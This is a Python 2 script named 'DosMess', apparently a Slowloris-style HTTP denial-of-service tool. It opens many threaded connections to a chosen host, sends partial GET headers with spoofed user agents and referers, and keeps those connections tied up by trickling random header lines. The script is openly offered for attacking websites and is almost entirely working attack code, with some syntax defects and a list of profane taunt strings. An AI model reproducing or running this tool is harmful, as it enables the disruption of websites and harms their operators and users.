
import os, sys, time
import socket, thread
import random
from threading import Lock


COLOR_BLACK     = 0
COLOR_RED       = 1
COLOR_GREEN     = 2
COLOR_YELLOW    = 3
COLOR_BLUE      = 4
COLOR_PINK      = 5
COLOR_CYAN      = 6
COLOR_WHITE     = 7
COLOR_RESET     = 9




def useragent_list():
	headers_useragents=[]

	with open('cleanuseragents', 'r') as f:
		lines = f.readlines()
	for line in lines:
		headers_useragents.append(line);
	return(headers_useragents)




def referer_list():
	headers_referers=[]
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://www.bing.com/search?q=')
	headers_referers.append('http://search.yahoo.com/search?p=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')

	return (headers_referers);

	
def keyword_list():
        keyword_top=[]
        keyword_top.append('S0u1izG0d')
        keyword_top.append('EatthisPussy')
        keyword_top.append('You Can Add Random Shit here lmao')
        keyword_top.append('Pussy')
        keyword_top.append('Hacking Liberations of The World')
        keyword_top.append('I fuck you up')
        keyword_top.append('Ebola')
        keyword_top.append('Knock Knock')
        keyword_top.append('Toast')
        keyword_top.append('Sorry.. Not')
        keyword_top.append('Dirty Bitch')
        keyword_top.append('Rachet Mother fuckers')
        keyword_top.append('Wild and Wet')
        keyword_top.append('1337')
        keyword_top.append('13333333333338')
        keyword_top.append('Dos')
        keyword_top.append('Hacker')
        keyword_top.append('DDOS')
        keyword_top.append('Love to fight')
        keyword_top.append('TICK TICK TOCK')
        keyword_top.append('Xbox One')
        keyword_top.append('S0u1')
        keyword_top.append('Elite cough lelelelelelelel')
        keyword_top.append('LulzSec')
        keyword_top.append('TAKE EM DOWN PEW PEW PEW')
        keyword_top.append('Anonymous')
        keyword_top.append('LLLLLLLLUUUUUUUUUUUUUUULLLLLLLLLLLLZZZZZZZZZZZZZSSSSSSSSSSEEEEEEEEEEEEECCCCCCC')
	keyword_top.append('vampi cyber girl is here to stay')

	#headers_referers.append('http://' + host + '/')
	return(keyword_top)

def inc_counter():
	global request_counter
	request_counter+=45

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1

def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 160)
		out_str += chr(a)
	return(out_str)

 
 
# Got this from a file I had lmao 
host = None
num_threads = 6
port = 80
dead = False
path = "/"
connection_amount = 20
iterations = 20
 
 
def out (n):
        sys.stdout.write(n)
def reset_effects ():
        out("\x1b[0m")
 
def exit ():
        reset_effects()
        print ""
        sys.exit(0)
 
def helptext ():
        print "Usage: %s is 1.1 for GNU/Linux - <hostname> [-t] [-c] [-p]\n" % sys.argv[0]
        print " EX. python DosMess.py www.website.com -t 1000 -c 1000 -p 80 -i 20"
        print ""
        print " HTTP method"
        print ""
        print "   -t\t\tSet number of threads"
        print "   -c\t\tSet number of connections per thread"
        print "   -i\t\tSet number of iterations per connection"
	print "   -sMi\t\tSet minimal seconds to sleep between http requests(optional)"
	print "   -sMa\t\tSet maxumum seconds to sleep between http requests(optional)"
        print "   -p\t\tSet host port number"
        print ""
        print " NEW ON UPDATES!!! - Gonna work on UDP on this tool :D  "
        print ""
        print " FB https://www.facebook.com/HLoTW/  : S0u1"
        exit()
 #From Hulk
def main (args):
        global host, port, num_threads, connection_amount, itr,  sleepMin, sleepMax

        pname = args[0]
        i = 1
        if len(args) == 1:
                helptext()
        while i < len(args):
                a = args[i]
               
                if a == "--help":
                        helptext()
                elif a == "-t":
                        i += 1
                        num_threads = int(args[i])
                elif a == "-p":
                        i += 1
                        port = int(args[i])
                elif a == "-c":
                        i += 1
                        connection_amount = int(args[i])
		elif a == "-i":
			i +=1
			itr = int(args[i])
		elif a == "-sMi":
			i +=1
			sleepMin = int(args[i])
		elif a == "-sMa":
			i +=1
			sleepMax = int(args[i])
                elif host == None:
                        host = args[i]
                else:
                        print "Invalid argument '%s'" % args[i]
                        exit()

                i += 1
        if host == None:
                print "Enter a target"
                exit()

	if sleepMin == None:
		sleepMin=3
	if sleepMax == None:
		sleepMax=10
 
        start()
 
 
 
# I added random thread making here 
def sender (num, headers_useragents, headers_referer, keyword_top):
        global dead

        def col ():
                color = (num % 6) + 1
                out("\x1b[%d;30m%02d\x1b[49;39m" % (color + 40, num))

        col()
        print " * | DosMess %d started" % num

        cons = []
	

        while True:                          # rapidly connects to server

                bleh = False
		rnd_num=int(random.random() * len(headers_useragents));
		rnd_num_1=int(random.random() * len(headers_referer));
		rnd_num_2=int(random.random() * len(keyword_top));


                for i in range (connection_amount):
                        s = socket.socket()
                        cons += [s]
                        try:				
                                s.connect((host, port))
				print(repr(s.recv(1024)))
				
                        except:
				p
                                col()
                                print " # | - ERROR IN THREAD %d: COULD NOT CONNECT" % num
                                bleh = True
		print "ooooooooo"
                if bleh:
                        continue


	

                col()
                print " O | Thread %d opened %d connections" % (num, connection_amount)


               #Also from hulk
                header = "GET %s HTTP/1.1\r\n" % path
                fulldata  = "Host: localhost\r\n"
                fulldata += "User-Agent: %s " % headers_useragents[rnd_num]
		fulldata += "Referer: %s%s" % (headers_referer[rnd_num_1], keyword_top)
                fulldata += "Accept-Language: en-US,en;q=0.8\r\n"
                fulldata += "\r\n"


                # send a beginning header
                try:
                        for c in cons:
                                c.send(header + fulldata)
				data = c.recv(4096) 
			
                except:
                        bleh = True

                i = 0
                cap = itr
                while i < cap and not bleh:
                        # send random headers that don't mean anything lulz 
                        data  = chr(65 + int(random.random() * 26))
                        data += chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26))
                        data += ": "
                        data += chr(65 + int(random.random() * 26)) + chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26))
                        data += chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26))
                        i += 1
                        for c in cons:
                                try:
                                        c.send(data)
                                except:
                                        bleh = True
                        col()
                        print " > | Thread %d sent some data (%d/%d)" % (num, i, cap)

                        # wait three seconds between each header.. o.O Lowest you can go is 1 :) ENJOY dont crash you computer -_-
                        time.sleep(random.randint(sleepMin, sleepMax));

                # if something went wrong
                if bleh:
                        for c in cons:
                                try:
                                        c.close()
                                except:
                                        pass
                        col()
                        print " X | :( < Sad face  Thread %d bleh, restart" % num
                        cons = []
                        continue

                #Some how nothing gone wrong after 100 headers so I didnt take it off  ( I should take this message out but idk :P
                time.sleep(2)
                for c in cons:
                        c.close()
                cons = []
                col()
                print " < | Thread %d closed all connections" % num
 
 
def start ():
	global headers_useragents, headers_referer, keyword_top
        # show a banner :P
        print "/------------------------------------------------------\\"
        h_on  = "\x1b[37;1m"
        h_off = "\x1b[39;22m"
       
        print " Targeting %s%s%s at port %s%d%s using %s%d%s threads" % (h_on, host, h_off, h_on, port, h_off, h_on, num_threads, h_off)
       
        print "\\------------------------------------------------------/"
       
        # you still have time to turn back
        time.sleep(1)
       
        # start threads

	headers_useragents=useragent_list() ;
	headers_referer=referer_list();
	keyword_top=keyword_list();



        for i in range(num_threads):
                thread.start_new_thread(sender,(i,headers_useragents,headers_referer, keyword_top ))
                time.sleep(0.1)
       
        # keyboard interrupt
        try:
                while not dead: pass
        except KeyboardInterrupt:
                print "\n\n - TERMINATING THE TOOL > Caught <Ctrl - C>\n"
                exit()
 
 

main(sys.argv)



exit()
